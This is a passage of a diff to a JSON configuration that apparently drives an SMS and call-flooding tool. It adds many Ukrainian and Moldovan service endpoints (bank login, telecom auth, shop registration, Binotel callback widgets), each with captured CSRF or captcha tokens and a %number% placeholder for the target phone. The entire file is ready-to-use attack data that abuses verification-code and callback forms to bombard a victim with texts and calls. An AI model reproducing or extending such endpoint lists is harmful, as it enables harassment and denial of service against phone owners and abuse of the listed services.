@@ -13,7 +13,7 @@
                       "json":{"msisdn":"%number%"},
                       "method":"post",
                       "ins": "###*********"
-                    }],
+              }],
         "calls":[ ],
         "sms":[{
                       "url":"https://eshop.moldcell.md/index.php?route=account/account/RealPhoneValidation",
@@ -32,12 +32,128 @@
       },
       "380":{
         "mix":[{
+              "url": "https://www.privat24.ua/http/?lang=en&pt=pt_16707490624140.31301796825041033&lang=en&xref=&fingerprint=c52b184f0b4c3e873d507b68c835f559-cyv3g2l3g",
+              "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json", "X-Request-origin":"https://next.privat24.ua"}],
+              "json": {"cmd":"show_login_form","fingerprint":"c52b184f0b4c3e873d507b68c835f559-cyv3g2l3g","version":"WEB2","lat":null,"lon":null,"action":"submit","login":"%number%"},
+              "method": "post",
+              "ins":"+************"
+                },
+                {
+                "url": "https://ufa.cvetov.ru/auth/",
+                "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded","Alt-Used":"ufa.cvetov.ru"}],
+                "data": "bxajaxid=b269bcbf36fbdbe8c0355434b1201e64&AJAX_CALL=Y&sessid=fad8539342e3b3d1c5de8b1dc619b01a&FORM_ID=bx_2390872570_form&country=ua&PHONE_NUMBER=%number%&LOGIN=%number%&CALL_AUTH_GET_CODE=%D0%9F%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D1%82%D1%8C+%D0%BA%D0%BE%D0%B4+%D0%BF%D0%BE+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BA%D1%83",
+                "method": "post",
+                "ins":"+***+****+*****"
+              },
+              {
+                  "url": "https://bi.ua/api/v1/accounts",
+                  "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Language":"uk","Authorization":"Bearer null","Content-Type":"application/json;charset=utf-8"}],
+                  "data": {"grand_type":"call_code","stage":"1","login":"%ru_name%","phone":"%number%"},
+                  "method": "post",
+                  "ins":"************"
+                  },
+
+              {
+                  "url": "https://www.foxtrot.com.ua/ru/account/login",
+                  "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                  "data": "Email=&Name=&Channel=Phone&phone=%number%&__RequestVerificationToken=CfDJ8FiRSGDF4HZBunFHSW02c6yw_dqp1O-3jM-MaskCoyLMSdt_7BZnb0ygzl1kWZjrUZSuWAqp1FwiCP_MtSLTaLAy0-AJ1TBFidNV3O-RMfqU9k_FVpVaCjw0HcT6L52in4nMqjnj02BJmJRJBwIPqjw&X-Requested-With=XMLHttpRequest",
+                  "method": "post",
+                  "ins":"************"
+                  },
+
+              {
+                  "url": "https://widgets.binotel.com/getcall/call/",
+                  "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                  "data": "widgetID=41778&externalNumber=%number%&scheduledCall=1&addingDays=0&scheduledAtHour=9&scheduledAtMinutes=0&sessionId=9cbb137c19482e611356626d79c98f77c8307323be76c18ed2411f2adb85f31d157344b128732774da9a8bfc9f50e303&visitorData%5BfirstVisitAt%5D=1671144834&visitorData%5BvisitsCount%5D=1&visitorData%5BcampaignCount%5D=1&visitorData%5BcurrentVisitStartedAt%5D=1671144834&visitorData%5BcurrentVisitLandingPage%5D=https%3A%2F%2Fkvitna.ua%2F&visitorData%5BcurrentVisitOpenPages%5D=1&visitorData%5Blocation%5D=https%3A%2F%2Fkvitna.ua%2F&visitorData%5BlocationTitle%5D=%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0+%D0%BA%D0%B2%D1%96%D1%82%D1%96%D0%B2+%D0%9B%D1%8C%D0%B2%D1%96%D0%B2.+Kvitna+%E2%9E%A8+%D0%9D%D0%B0%D0%B4%D0%B7%D0%B2%D0%B8%D1%87%D0%B0%D0%B9%D0%BD%D0%B0+%D1%84%D0%BB%D0%BE%D1%80%D0%B8%D1%81%D1%82%D0%B8%D0%BA%D0%B0&visitorData%5BuserAgent%5D=Mozilla%2F5.0+(X11%3B+Linux+x86_64%3B+rv%3A102.0)+Gecko%2F20100101+Firefox%2F102.0&visitorData%5Blanguage%5D=en-us&visitorData%5Bencoding%5D=utf-8&visitorData%5BscreenResolution%5D=1366x768&visitorData%5BcurrentVisitUpdatedAt%5D=1671144834&visitorData%5ButmDataCurrent%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataCurrent%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Bbeginning_at%5D=1671144834&visitorData%5BcampaignTime%5D=1671144834&visitorData%5ButmDataFirst%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataFirst%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Bbeginning_at%5D=1671144834&visitorData%5BgeoipData%5D%5Bcountry%5D=Romania&visitorData%5BgeoipData%5D%5Bregion%5D=&visitorData%5BgeoipData%5D%5Bcity%5D=&visitorData%5BgeoipData%5D%5Borg%5D=&description=+.&googleAnalyticsData%5Bname%5D=t0&googleAnalyticsData%5BtrackingId%5D=UA-66630543-1&googleAnalyticsData%5BclientId%5D=1946027149.1671144835",
+                  "method": "post",
+                  "ins":"##**********"
+                  },
+
+              {
+                  "url": "https://widgets.binotel.com/getcall/call/",
+                  "headers": [{"User-Agent": " ", "Accept":"application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                  "data": "widgetID=40824&externalNumber=%number%&scheduledCall=1&addingDays=0&scheduledAtHour=8&scheduledAtMinutes=0&sessionId=70af8de95f87a131bab78f0110bd39103489fc29da7edc5292eac1f1da2f71314406bb88b8a91d24b1d2a81795e6aaef&visitorData%5BfirstVisitAt%5D=1671144709&visitorData%5BvisitsCount%5D=1&visitorData%5BcampaignCount%5D=1&visitorData%5BcurrentVisitStartedAt%5D=1671144709&visitorData%5BcurrentVisitLandingPage%5D=https%3A%2F%2Fwww.sportland.km.ua%2F&visitorData%5BcurrentVisitOpenPages%5D=1&visitorData%5Blocation%5D=https%3A%2F%2Fwww.sportland.km.ua%2F&visitorData%5BlocationTitle%5D=%D0%A4%D1%96%D1%82%D0%BD%D0%B5%D1%81+%D0%BA%D0%BB%D1%83%D0%B1+%22%D0%A1%D0%BF%D0%BE%D1%80%D1%82%D0%9B%D0%B5%D0%BD%D0%B4%22%2C+%D0%BC.%D0%A5%D0%BC%D0%B5%D0%BB%D1%8C%D0%BD%D0%B8%D1%86%D1%8C%D0%BA%D0%B8%D0%B9+-%C2%A0+%D0%9E%D1%84%D1%96%D1%86%D1%96%D0%B9%D0%BD%D0%B8%D0%B9+%D1%81%D0%B0%D0%B9%D1%82&visitorData%5BuserAgent%5D=Mozilla%2F5.0+(X11%3B+Linux+x86_64%3B+rv%3A102.0)+Gecko%2F20100101+Firefox%2F102.0&visitorData%5Blanguage%5D=en-us&visitorData%5Bencoding%5D=utf-8&visitorData%5BscreenResolution%5D=1366x768&visitorData%5BcurrentVisitUpdatedAt%5D=1671144709&visitorData%5ButmDataCurrent%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataCurrent%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Bbeginning_at%5D=1671144709&visitorData%5BcampaignTime%5D=1671144709&visitorData%5ButmDataFirst%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataFirst%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Bbeginning_at%5D=1671144709&visitorData%5BgeoipData%5D%5Bcountry%5D=Romania&visitorData%5BgeoipData%5D%5Bregion%5D=&visitorData%5BgeoipData%5D%5Bcity%5D=&visitorData%5BgeoipData%5D%5Borg%5D=&description=&googleAnalyticsData%5Bname%5D=gtag_UA_147947555_1&googleAnalyticsData%5BtrackingId%5D=UA-147947555-1&googleAnalyticsData%5BclientId%5D=1265143227.1671144710",
+                  "method": "post",
+                  "ins":"##**********"
+                  },
+
+              {
+                  "url": "https://widgets.binotel.com/getcall/call/",
+                  "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                  "data": "widgetID=61930&externalNumber=%number%&scheduledCall=1&addingDays=1&scheduledAtHour=9&scheduledAtMinutes=0&sessionId=938568e699a26db869f2e7738c5161a4ab4a4a04b6a99904df4d2fb35877a81b705a5c2a7ee8132b0d7ab824c11ffe0f&visitorData%5BfirstVisitAt%5D=1671144330&visitorData%5BvisitsCount%5D=1&visitorData%5BcampaignCount%5D=1&visitorData%5BcurrentVisitStartedAt%5D=1671144330&visitorData%5BcurrentVisitLandingPage%5D=https%3A%2F%2Ffitnesstime.ua%2F&visitorData%5BcurrentVisitOpenPages%5D=3&visitorData%5Blocation%5D=https%3A%2F%2Ffitnesstime.ua%2Fru%2Fkluby&visitorData%5BlocationTitle%5D=%D0%A2%D1%80%D0%B5%D0%BD%D0%B0%D0%B6%D0%B5%D1%80%D0%BD%D1%8B%D0%B5+%D0%B7%D0%B0%D0%BB%D1%8B+%D0%B2+%D0%92%D0%B8%D0%BD%D0%BD%D0%B8%D1%86%D0%B5+%E2%80%94+%D1%84%D0%B8%D1%82%D0%BD%D0%B5%D1%81+%D0%BA%D0%BB%D1%83%D0%B1%D1%8B+Fitness+Time+(%D0%92%D0%B8%D0%BD%D0%BD%D0%B8%D1%86%D0%B0)&visitorData%5BuserAgent%5D=Mozilla%2F5.0+(X11%3B+Linux+x86_64%3B+rv%3A102.0)+Gecko%2F20100101+Firefox%2F102.0&visitorData%5Blanguage%5D=en-us&visitorData%5Bencoding%5D=utf-8&visitorData%5BscreenResolution%5D=1366x768&visitorData%5BcurrentVisitUpdatedAt%5D=1671144362&visitorData%5ButmDataCurrent%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataCurrent%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Bbeginning_at%5D=1671144330&visitorData%5BcampaignTime%5D=1671144330&visitorData%5ButmDataFirst%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataFirst%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Bbeginning_at%5D=1671144330&visitorData%5BgeoipData%5D%5Bcountry%5D=Romania&visitorData%5BgeoipData%5D%5Bregion%5D=&visitorData%5BgeoipData%5D%5Bcity%5D=&visitorData%5BgeoipData%5D%5Borg%5D=&description=&googleAnalyticsData%5Bname%5D=gtm2&googleAnalyticsData%5BtrackingId%5D=UA-92337350-1&googleAnalyticsData%5BclientId%5D=1756199462.1671144332",
+                  "method": "post",
+                  "ins":"##**********"
+                },
+                  {
                       "url": "https://www.monobank.ua/api/mobapplink/snd",
                       "headers": [{"User-Agent": " ", "Accept":"application/json", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/x-www-form-urlencoded", "x-captcha":"B03AEkXODCRD75eJuM8nK7QIWXFLIZY71WyPNfeFPUVyIo-CS1Ga1kYVJ8c0Ox4Oojk1JMCAI-1HdcLjVuconWka7jadtGCmnWsulwjijICMjluZe7Jh5vkr0vcKciKy0WE3JExMzuhDCG6dsb7tV27_d-CpGTOGWLhWNCuE80oGkTzl1-KP8iBKMqYTvTvC4-feKtKPNJe-ccQGQtWogJ5I_h7mMbgECinp3ojRb-87xOiLHhxnDVcVUSXd1ZKT0pz4euyTLWpuLmjp-VYyvNBFgLh7RcZqUbLJ0kmnJOHhq4BzN2DrsV845uLenU1I9UYwT8DSjoBWYSXWF6Sm-K26_PGSVFjlN5Q2lIZ6k_zaHfwze5-ShF-024e0EbuixDbRakrrsIaVNiQJmZVkfFeVPZ3OR4EEYHnFnfqarlm3xHTwrXmlq3thiq9JQxhAJFXPrpdYXV6G4b8ajCosxajp6PZKoP3wSomjpE5g1J0_tCXrCd8ylLlTRh9eQSjlymMrnbd2bFQfpxUtVzGwX6nfWrg6liyEB3vbw"}],
                       "data": "phone=%number%",
                       "method": "post",
                       "ins":"+************"
                },
+               {
+                   "url": "https://www.intimo.com.ua/auth/loginphone/",
+                   "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-Token":"SPrpPT7dwhb702mHlfoJcPe5akdeEkR7Fzy_oA_wZRZ5oLhxcq6sUZD-L8bFk01JgctcHxV3EwhYfc3EVYdWXQ==","X-Requested-With":"XMLHttpRequest"}],
+                   "data": "phone=%number%&operator=725&captchaVal=&gaClientId=",
+                   "method": "post",
+                   "ins":"+**+(***)+***-**-**"
+                   },
+
+               {
+                   "url": "https://auth.lifecell.ua/auth/realms/lifecell/login-actions/authenticate?session_code=jUxE_2Z-g235UsGIp1Yi3AO7Uu5AR9SNbWi99pYRayw&execution=262f793c-c567-4528-bb06-4ca3c73b63ad&client_id=lifecell-js&tab_id=Y9trQicHzc8",
+                   "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                   "data": "rememberMe=on&username=%number%&g-recaptcha-response=03AD1IbLDB58brQ0RTR8QYjWSxcBHdUMtEgyGl4mBXc7oTbg6otvAsk8EiQcp0kO5iL8QQHPH0Itx06lhRoKEXm7PIBUica3FvQjJlFs3svBsya1qQ8uFyD7CxI9fnfNhhUdRexB4Yok1YaibOp16XiIFr2jPx_E6FaX7IKgB4bFu8FsqyRBHiRiJvlU1kdpTrZ0X9yD8WWqBxCzmMGks0cLHfvmlNXrNlyFKHrEC_Wl3hYCeJJ7XmXRfYnNWJWNuFHlSIyRfjVPVKpkPwsvjJChAMLAgC8aQx8_xUlwcHIoI7l7RNbSxI7BpLgC6kQ4AEXozBz5_k6C28siT8jL_rcC48c7WhhYpVOqJCoP95IkAYB5sOYNdOLbXjlAjHIlufQOOp1eaQKyllko16sNdPK4OexvNay3CalaUJW3t1BlCDhqlbJ5NW2G5EKmTFErCW4Ov6FtQX7l9HWXlfLGOehlixa8MuiDB7EtGBVh0Wl4vOxkhk0PoRQkoZMorfn0XPq3c_2JmEFRpjBVf6Pl4hN4yOK4a1_cJ_hw",
+                   "method": "post",
+                   "ins":"************"
+                   },
+
+               {
+                   "url": "https://sex-shop.ua/bitrix/components/bxmaker/authuserphone.login/ajax.php",
+                   "headers": [{"User-Agent": " ", "Accept":"application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                   "data": "parameters=YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30%3D.886837943a18715db75ae7fe96ae97183ca0be0637a0bc22ca3ba8d04e55b81f&template=.default.0439327cbb51aa71d187d378db240bf43d3133d2e235a6d74509561d345ec422&siteId=s1&sessid=f43b7e1f5fb766efbaa83d3cd1292495&method=sendCode&phone=%number%&registration=N",
+                   "method": "post",
+                   "ins":"+***+(**)+***-**-**"
+                   },
+
+               {
+                   "url": "https://ua.jooble.org/api/Authentication/PhoneVerification",
+                   "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","content-type":"application/json","trace-id":"cuFAwZywUKLcfTvtPQywEzAUYzkdQ4dE"}],
+                   "json": {"phone":"%number%","captchaToken":"03AD1IbLC7ra-doyetf7bdJFLAbX1rk4QzWTi85_u_XPjzj9tH8F0Auk_CFJLJd9p0MtkQkg-XE27urZkEBdmkSMnCQRTsRmwl1F_YTDEBoQ22L0Xn8gi-C1bLR-ABystVmSE6NizrfL-9ylGubr4IN2MyoIQTDIGPo4KeXcpZw9Wyt_L_2w06On4v7DSAtVz1w7K7ToRXHy5PjjuywGg3VnZuQ55uBYm2HEmjGBDRHirIgRwpEW1qKEtuyoqmCtTIm7h7wLDVqndtbLkrK2IRSp0Tn3RdQcuI9Y3vvcruxEiHsBnJ9qI-uZaxa2Q2hTZRArlIiGCP-4nrHc3cbGX28mcd56nydcgxGLLKAIH7DlH_qgs0fYQG3Efigi6K-jQ9u5LfRDRd15rWtFyiiWVKB5_anAREPEeY9ZT7u4zrPEW0uNIY8DnwT6wmu8EULO3fnfQqA5tFvnPJ0qJ3uUTlxd0Sx_VpyP64_GNbBqpz6XFGnMHnRBZRb2IHRwygNUito9apVomj-MeBuM4Gyt33nFZ5zQqszGJf4g"},
+                   "method": "post",
+                   "ins":"+************"
+                   },
+
+               {
+                   "url": "https://hotline.ua/register/",
+                   "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                   "data": "login=%number%&name=%name%&password=%password%",
+                   "method": "post",
+                   "ins":"************"
+                   },
+
+               {
+                   "url": "https://www.poehalisnami.ua/account/register",
+                   "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                   "data": "__RequestVerificationToken=RQSZuCP3HwGkS1ErqtWzMkz972hVT8QPPEg4rF71o7S37VAY7s9fkV-DsMIIIA43BQpNxA2&Name=ASD&Phone=%number%&PhoneCountrySiteDropDownList.Value=ua&Email=%email%&Password=%password%&X-Requested-With=XMLHttpRequest",
+                   "method": "post",
+                   "ins":"+***(**)***-**-**"
+                   },
+
+               {
+                   "url": "https://www.work.ua/jobseeker/register/",
+                   "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                   "data": "user_login=%number%&g-recaptcha-response=03AD1IbLAb8G-Ii-abKCot96UyANuiBamC17vcNeOhcgE3YyZ2f9X4GwQ5NMp2F1ndWqriG_d8u_8jslq-hBHTO2FOCWOE-ttKsABu3L6qKshTMhfs3yEQ8Ux0fVx_ebYdyiCAnh9Q1t0pgTik1Efk6_RQwCf74wA_6OqvIfQVEFGCLxW2pXuGhaDWXq4_xm4hZ74JVCztJJrFWs3A6eFobUCWh5Inl5fzM6Mbv7A0oDGyicQWjhRia-91qbtUt5sgDHfliF69l1SCeMx1-FVit77i0ILZPOUCQ-RiCWpWo_gmtembOugQMXH6qPq-Q3TlubfJl0Bkq_927q5eUkdhmiv2I9da6TMGmTAQCIcIt-8hTJTtWxGMbJ6XCSxaOlRIjVDkIaEDilAXl6_300eCN0QK3CESaT1cjTscpPIU0DhAqPIvaC86cl0lF6cyVoXJ0lJfiCMol5ILpC-U6hPO9-y41lFKx1L3ccXA-RiKFUiD81G-bx5qjxYvMqnBW7uXEDH2pgfAQ3NFgReNnhxHfCPXCiMeGFb3lw",
+                   "method": "post",
+                   "ins":"+************"
+                   },
+
+               {
+                   "url": "https://auth2.multiplex.ua/login",
+                   "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/json;charset=utf-8"}],
+                   "data": {"login":"%number%"},
+                   "method": "post",
+                   "ins":"************"
+                },
                {
                       "url": "https://busfor.ua/api/v1/sms_auth/send_code",
                       "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "X-CSRF-Token":"tzKz9mq3oowjDQo-AJ1KST1thRquEhD4sYL9VzAsEXoTb73ZDYSSv2637cdDsvMWNQXt_zVZ7ZzNHmpDVAXQbA","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
@@ -53,7 +169,7 @@
                     "ins":"+************"
                 },
                 {
-                    "url": "https://allo.ua/ua/customer/account/createPostVue/?isAjax=1&currentLocale=uk_UA",
+                              "url": "https://allo.ua/ua/customer/account/createPostVue/?isAjax=1&currentLocale=uk_UA",
                     "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","X-Requested-With":"XMLHttpRequest", "Content-Type":"application/x-www-form-urlencoded", "X-USE-NUXT":"1", "stackTrace":"You can check it in Chrome or Safari"}],
                     "data": "firstname=%name%&telephone=%number%&email=%email%&password=%password%&form_key=E3wrnKXLu0mn7URJ",
                     "method": "post",
@@ -231,23 +347,7 @@
                      "method":"get",
                      "ins":"************"
 
-                   },
-                   {
-              "url": "https://www.privat24.ua/http/?lang=en&pt=pt_16707490624140.31301796825041033&lang=en&xref=&fingerprint=c52b184f0b4c3e873d507b68c835f559-cyv3g2l3g",
-              "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/json", "X-Request-origin":"https://next.privat24.ua"}],
-              "json": {"cmd":"show_login_form","fingerprint":"c52b184f0b4c3e873d507b68c835f559-cyv3g2l3g","version":"WEB2","lat":null,"lon":null,"action":"submit","login":"%number%"},
-              "method": "post",
-              "ins":"+************"
-                },
-                {
-                "url": "https://ufa.cvetov.ru/auth/",
-                "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded","Alt-Used":"ufa.cvetov.ru"}],
-                "data": "bxajaxid=b269bcbf36fbdbe8c0355434b1201e64&AJAX_CALL=Y&sessid=fad8539342e3b3d1c5de8b1dc619b01a&FORM_ID=bx_2390872570_form&country=ua&PHONE_NUMBER=%number%&LOGIN=%number%&CALL_AUTH_GET_CODE=%D0%9F%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D1%82%D1%8C+%D0%BA%D0%BE%D0%B4+%D0%BF%D0%BE+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BA%D1%83",
-                "method": "post",
-                "ins":"+***+****+*****"
-              }
-
-              ],
+                   }],
 
         "calls":[
           {
@@ -263,7 +363,46 @@
                   "data": "bxajaxid=b269bcbf36fbdbe8c0355434b1201e64&AJAX_CALL=Y&sessid=fad8539342e3b3d1c5de8b1dc619b01a&FORM_ID=bx_2390872570_form&country=ua&PHONE_NUMBER=%number%&LOGIN=%number%&CALL_AUTH_GET_CODE=%D0%9F%D0%BE%D0%BB%D1%83%D1%87%D0%B8%D1%82%D1%8C+%D0%BA%D0%BE%D0%B4+%D0%BF%D0%BE+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BA%D1%83",
                   "method": "post",
                   "ins":"+***+****+*****"
-                }
+                },
+                {
+                    "url": "https://bi.ua/api/v1/accounts",
+                    "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5","Language":"uk","Authorization":"Bearer null","Content-Type":"application/json;charset=utf-8"}],
+                    "data": {"grand_type":"call_code","stage":"1","login":"%ru_name%","phone":"%number%"},
+                    "method": "post",
+                    "ins":"************"
+                    },
+
+                {
+                    "url": "https://www.foxtrot.com.ua/ru/account/login",
+                    "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}],
+                    "data": "Email=&Name=&Channel=Phone&phone=%number%&__RequestVerificationToken=CfDJ8FiRSGDF4HZBunFHSW02c6yw_dqp1O-3jM-MaskCoyLMSdt_7BZnb0ygzl1kWZjrUZSuWAqp1FwiCP_MtSLTaLAy0-AJ1TBFidNV3O-RMfqU9k_FVpVaCjw0HcT6L52in4nMqjnj02BJmJRJBwIPqjw&X-Requested-With=XMLHttpRequest",
+                    "method": "post",
+                    "ins":"************"
+                    },
+
+                {
+                    "url": "https://widgets.binotel.com/getcall/call/",
+                    "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                    "data": "widgetID=41778&externalNumber=%number%&scheduledCall=1&addingDays=0&scheduledAtHour=9&scheduledAtMinutes=0&sessionId=9cbb137c19482e611356626d79c98f77c8307323be76c18ed2411f2adb85f31d157344b128732774da9a8bfc9f50e303&visitorData%5BfirstVisitAt%5D=1671144834&visitorData%5BvisitsCount%5D=1&visitorData%5BcampaignCount%5D=1&visitorData%5BcurrentVisitStartedAt%5D=1671144834&visitorData%5BcurrentVisitLandingPage%5D=https%3A%2F%2Fkvitna.ua%2F&visitorData%5BcurrentVisitOpenPages%5D=1&visitorData%5Blocation%5D=https%3A%2F%2Fkvitna.ua%2F&visitorData%5BlocationTitle%5D=%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0+%D0%BA%D0%B2%D1%96%D1%82%D1%96%D0%B2+%D0%9B%D1%8C%D0%B2%D1%96%D0%B2.+Kvitna+%E2%9E%A8+%D0%9D%D0%B0%D0%B4%D0%B7%D0%B2%D0%B8%D1%87%D0%B0%D0%B9%D0%BD%D0%B0+%D1%84%D0%BB%D0%BE%D1%80%D0%B8%D1%81%D1%82%D0%B8%D0%BA%D0%B0&visitorData%5BuserAgent%5D=Mozilla%2F5.0+(X11%3B+Linux+x86_64%3B+rv%3A102.0)+Gecko%2F20100101+Firefox%2F102.0&visitorData%5Blanguage%5D=en-us&visitorData%5Bencoding%5D=utf-8&visitorData%5BscreenResolution%5D=1366x768&visitorData%5BcurrentVisitUpdatedAt%5D=1671144834&visitorData%5ButmDataCurrent%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataCurrent%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataCurrent%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataCurrent%5D%5Bbeginning_at%5D=1671144834&visitorData%5BcampaignTime%5D=1671144834&visitorData%5ButmDataFirst%5D%5Butm_source%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_medium%5D=(none)&visitorData%5ButmDataFirst%5D%5Butm_campaign%5D=(direct)&visitorData%5ButmDataFirst%5D%5Butm_content%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Butm_term%5D=(not+set)&visitorData%5ButmDataFirst%5D%5Bbeginning_at%5D=1671144834&visitorData%5BgeoipData%5D%5Bcountry%5D=Romania&visitorData%5BgeoipData%5D%5Bregion%5D=&visitorData%5BgeoipData%5D%5Bcity%5D=&visitorData%5BgeoipData%5D%5Borg%5D=&description=+.&googleAnalyticsData%5Bname%5D=t0&googleAnalyticsData%5BtrackingId%5D=UA-66630543-1&googleAnalyticsData%5BclientId%5D=1946027149.1671144835",
+                    "method": "post",
+                    "ins":"##**********"
+                    },
+
+                {
+                    "url": "https://widgets.binotel.com/getcall/call/",
+                    "headers": [{"User-Agent": " ", "Accept":"application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+                    "data": "widgetID=40824&externalNumber=%number%&scheduledCall=1&addingDays=0&scheduledAtHour=8&scheduledAtMinutes=0&sessionId=70af8de95f87a131bab78f0110bd39103489fc29da7edc5292eac1f1da2f71314406bb88b8a91d24b1d2a81795e6aaef&visitorData%5BfirstVisitAt%5D=1671144709&visitorData%5BvisitsCount%5D=1&visitorData%5BcampaignCount%5D=1&visitorData%5BcurrentVisitStartedAt%5D=1671144709&visitorData%5BcurrentVisitLandingPage%5D=https%3A%2F%2Fwww.sportland.km.ua%2F&visitorData%5BcurrentVisitOpenPages%5D=1&visitorData%5Blocation%5D=https%3A%2F%2Fwww.sportland.km.ua%2F&visitorData%5BlocationTitle%5D=%D0%A4%D1%96%D1%82%D0%BD%D0%B5%D1%81+%D0%BA%D0%BB%D1%83%D0%B1+%22%D0%A1%D0%BF%D0%BE%D1%80%D1%82%D0%9B%D0%B5%D0%BD%D0%B4%22%2C+%D0%BC.%D0%A5%D0%BC%D0%B5%D0%BB%D1%8C%D0%BD%D0%B8%D1%86%D1%8C%D0%BA%D0%B8%D0%B9+-%C2%A0+%D0%9E%D1%84%D1%96%D1%86%D1%96%D0%B9